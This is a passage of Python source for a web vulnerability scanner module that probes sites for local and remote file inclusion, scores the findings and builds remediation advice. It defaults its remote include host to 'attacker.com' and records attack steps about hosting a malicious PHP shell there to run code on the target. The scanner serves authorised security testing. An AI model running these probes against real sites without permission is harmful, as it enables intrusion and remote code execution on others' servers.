            if not resp:
                continue
            is_lfi, _, is_rce, _, ev = self._analyser.analyse(
                resp, payload, payload, baseline_len
            )
            if is_rce or is_lfi:
                findings.append(self._make(
                    variant   = variant,
                    severity  = FindingSeverity.CRITICAL,
                    status    = FindingStatus.CONFIRMED,
                    target    = target,
                    payload   = payload,
                    evidence  = ev,
                    file_read = ev.get("shell_output") or ev.get("match"),
                    steps=[
                        f"RFI payload {payload[:60]} caused server to load attacker URL",
                        "Host malicious PHP at attacker.com/shell.php",
                        "Execute arbitrary code on target server",
                    ],
                    notes=f"RFI confirmed — {desc}",
                ))
                break

            # Even without RCE, check if the target tried to fetch the URL
            # (OOB RFI probe — connection attempt to attacker host in timing)
            # Flag as POSSIBLE if status changed from baseline
            if resp.status_code not in (404, 400) and baseline_len is not None:
                delta = abs(len(resp.text) - baseline_len)
                if delta > 100:
                    findings.append(self._make(
                        variant   = variant,
                        severity  = FindingSeverity.HIGH,
                        status    = FindingStatus.POSSIBLE,
                        target    = target,
                        payload   = payload,
                        evidence  = {**ev, "length_delta": delta},
                        file_read = None,
                        steps=[
                            "RFI parameter accepted remote URL — possible outbound fetch",
                            "Confirm with OOB server (interactsh, Burp Collaborator)",
                        ],
                        notes=f"RFI surface possible — {desc}",
                    ))
                    break

        return findings

    # ── helpers ───────────────────────────────────────────────────────────────

    def _baseline(self, target: LfiTarget) -> Optional[int]:
        """GET/POST with a benign value to establish body length baseline."""
        resp = self._inject(target, "index")
        return len(resp.text) if resp else None

    def _inject(self, target: LfiTarget, payload: str) -> Optional[Response]:
        if target.method == "GET":
            url = self._build_url(target, payload)
            return self._http.get_raw_url(url)
        else:
            return self._http.post(target.url, data={target.param: payload})

    @staticmethod
    def _build_url(target: LfiTarget, payload: str) -> str:
        parsed = urlparse(target.url)
        qs     = parse_qs(parsed.query)
        qs[target.param] = [payload]
        new_qs = _ue({k: v[0] for k, v in qs.items()}, quote_via=quote)
        return urlunparse(parsed._replace(query=new_qs))

    @staticmethod
    def _make(
        variant:   LfiVariant,
        severity:  FindingSeverity,
        status:    FindingStatus,
        target:    LfiTarget,
        payload:   str,
        evidence:  Dict[str, Any],
        file_read: Optional[str],
        steps:     List[str],
        notes:     str,
    ) -> LfiFinding:
        return LfiFinding(
            finding_id   = str(uuid.uuid4()),
            variant      = variant,
            severity     = severity,
            status       = status,
            target_url   = target.url,
            param        = target.param,
            payload      = payload,
            evidence     = evidence,
            file_read    = file_read,
            attack_steps = steps,
            notes        = notes,
        )


# ─────────────────────────────────────────────────────────────────────────────
# Scorer and recommendation builder
# ─────────────────────────────────────────────────────────────────────────────

class _Scorer:
    _W = {
        FindingStatus.CONFIRMED: 1.0,
        FindingStatus.LIKELY:    0.65,
        FindingStatus.POSSIBLE:  0.4,
        FindingStatus.NOT_VULN:  0.0,
    }

    def score(self, findings: List[LfiFinding]) -> Tuple[float, str]:
        if not findings:
            return 0.0, "INFO"
        raw = sum(f.severity.value * self._W.get(f.status, 0.5) for f in findings)
        cap = len(findings) * FindingSeverity.CRITICAL.value
        s   = min(100.0, (raw / cap) * 100) if cap else 0.0
        label = (
            "CRITICAL" if s >= 80 else
            "HIGH"     if s >= 60 else
            "MEDIUM"   if s >= 40 else
            "LOW"      if s >= 20 else
            "INFO"
        )
        return round(s, 2), label


class _RecBuilder:
    _RECS: Dict[LfiVariant, str] = {
        LfiVariant.TRAVERSAL_RELATIVE:
            "Never pass user input directly to file inclusion functions. "
            "Use a fixed allowlist of files; map input to real paths server-side.",
        LfiVariant.TRAVERSAL_ABSOLUTE:
            "Canonicalise paths with realpath() and verify they reside within the document root.",
        LfiVariant.BYPASS_NULL_BYTE:
            "Upgrade PHP ≥ 5.3.4 (null byte fixed); use basename() on user input.",
        LfiVariant.BYPASS_DOUBLE_ENCODE:
            "Decode URL sequences before path validation, not after.",
        LfiVariant.BYPASS_UTF8_OVERLONG:
            "Reject overlong UTF-8 sequences before path handling.",
        LfiVariant.BYPASS_PATH_NORMALISE:
            "Normalise path before validation: resolve all ../ sequences.",
        LfiVariant.WRAPPER_PHP_FILTER_B64:
            "Set allow_url_fopen=Off and allow_url_include=Off in php.ini.",
        LfiVariant.WRAPPER_PHP_FILTER_CHAIN:
            "Disable filter chains: validate that file:// is the only allowed scheme.",
        LfiVariant.WRAPPER_PHP_INPUT:
            "Disable php://input wrapper — set allow_url_include=Off.",
        LfiVariant.WRAPPER_PHP_DATA:
            "Disable data:// scheme in include paths — allow_url_include=Off.",
        LfiVariant.WRAPPER_PHP_EXPECT:
            "expect extension should not be loaded (remove from php.ini).",
        LfiVariant.WRAPPER_ZIP:
            "Validate MIME type and extension of uploaded files; store outside web root.",
        LfiVariant.WRAPPER_PHAR:
            "Disable phar:// in include paths; validate serialised data with allowlist.",
        LfiVariant.LOG_POISON_UA:
            "Never include log files in LFI-vulnerable parameters; "
            "disable logging of user-controlled input.",
        LfiVariant.LOG_POISON_PROC_ENVIRON:
            "Disable access to /proc; set open_basedir in php.ini.",
        LfiVariant.LOG_POISON_SESSION:
            "Store sessions outside web root; set session.save_path to restricted directory.",
        LfiVariant.RFI_HTTP:
            "Set allow_url_include=Off and allow_url_fopen=Off; block outbound HTTP from web server.",
        LfiVariant.RFI_DATA_URI:
            "Same as RFI_HTTP — disable data:// scheme in include.",
        LfiVariant.RFI_SMB:
            "Block outbound SMB (445/TCP) from web server tier at firewall.",
    }

    def build(self, findings: List[LfiFinding]) -> List[str]:
        seen:  Set[LfiVariant] = set()
        recs:  List[str] = []
        for f in sorted(findings, key=lambda x: (-x.severity.value,
                                                   x.status != FindingStatus.CONFIRMED)):
            if f.variant not in seen:
                seen.add(f.variant)
                recs.append(f"[{f.severity.name}][{f.variant.value}] "
                            f"{self._RECS.get(f.variant, 'Restrict file inclusion to a fixed allowlist.')}")
        return recs


# ─────────────────────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────────────────────

class LfiRfi:
    """
    Drop-in ARTEX module.

    Usage in app.py (run_scan), after payload_analysis + tech_detection:

        from core.lfi_rfi import LfiRfi

        lr = LfiRfi()
        scan_results[scan_id]['lfi_rfi'] = lr.run(
            domain=domain,
            scan_results=scan_results[scan_id],
        )
    """

    def __init__(
        self,
        rfi_host:   str   = "attacker.com",
        timeout:    float = 9.0,
        delay:      float = 0.3,
        on_finding: Optional[Callable[[LfiFinding], None]] = None,
    ):
        self._rfi_host  = rfi_host
        self._timeout   = timeout
        self._delay     = delay
        self._on_finding = on_finding

    def run(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> Dict[str, Any]:
        run_id     = str(uuid.uuid4())
        started_at = datetime.now()
        logger.info("LfiRfi %s starting for %s", run_id, domain)

        # detect PHP and Windows from tech stack
        all_techs: List[str] = []
        for url, td in scan_results.get("tech_detection", {}).items():
            for t in td.get("technologies", []):
                all_techs.append((t.get("name") or "").lower())

        is_php = any("php" in t for t in all_techs)
        is_win = any(t in ("iis", "asp", "asp.net", "windows") for t in all_techs)

        http     = _HttpPool(timeout=self._timeout, delay=self._delay)
        factory  = _PayloadFactory(rfi_host=self._rfi_host,
                                   is_php=is_php, is_windows=is_win)
        analyser = _ResponseAnalyser()
        executor = _ProbeExecutor(http, factory, analyser, is_php, is_win)

        # discover targets
        discoverer = _TargetDiscoverer()
        targets    = discoverer.discover(domain, scan_results)
        logger.info("LFI/RFI targets: %d  is_php=%s is_win=%s",
                    len(targets), is_php, is_win)

        all_findings: List[LfiFinding] = []
        lock         = threading.Lock()

        def probe_one(t: LfiTarget) -> None:
            try:
                res = executor.probe(t)
            except Exception as exc:
                logger.debug("Probe %s/%s failed: %s", t.url, t.param, exc)
                res = []
            with lock:
                all_findings.extend(res)
                if self._on_finding:
                    for f in res:
                        try:
                            self._on_finding(f)
                        except Exception:
                            pass

        threads = [threading.Thread(target=probe_one, args=(t,)) for t in targets]
        for th in threads:
            th.start()
        for th in threads:
            th.join()

        all_findings.sort(
            key=lambda f: (-f.severity.value, f.status != FindingStatus.CONFIRMED)
        )

        files_read = list({
            f.evidence.get("file", f.evidence.get("pattern", ""))
            for f in all_findings
            if f.file_read and f.status == FindingStatus.CONFIRMED
        } - {""})

        rce_via_wrapper = any(
            f.variant in (
                LfiVariant.WRAPPER_PHP_INPUT, LfiVariant.WRAPPER_PHP_DATA,
                LfiVariant.WRAPPER_PHP_EXPECT, LfiVariant.LOG_POISON_UA,
                LfiVariant.LOG_POISON_REFER, LfiVariant.LOG_POISON_PROC_ENVIRON,
                LfiVariant.LOG_POISON_SESSION, LfiVariant.RFI_HTTP,
                LfiVariant.RFI_DATA_URI, LfiVariant.WRAPPER_PHP_FILTER_CHAIN,
            )
            for f in all_findings
            if f.status == FindingStatus.CONFIRMED
        )

        scorer = _Scorer()
        score, risk_level = scorer.score(all_findings)
        recs   = _RecBuilder().build(all_findings)

        finished_at = datetime.now()
        result = LfiResult(
            run_id            = run_id,
            domain            = domain,
            targets_tested    = len(targets),
            findings          = [f.to_dict() for f in all_findings],
            files_read        = files_read,
            rce_via_wrapper   = rce_via_wrapper,
            score             = score,
            risk_level        = risk_level,
            techniques_tested = sorted({f.variant.value for f in all_findings}),
            recommendations   = recs,
            started_at        = started_at,
            finished_at       = finished_at,
        )

        logger.info(
            "LfiRfi %s done — score=%.1f risk=%s findings=%d files=%d rce=%s",
            run_id, score, risk_level, len(all_findings),
            len(files_read), rce_via_wrapper,
        )
        return result.to_dict()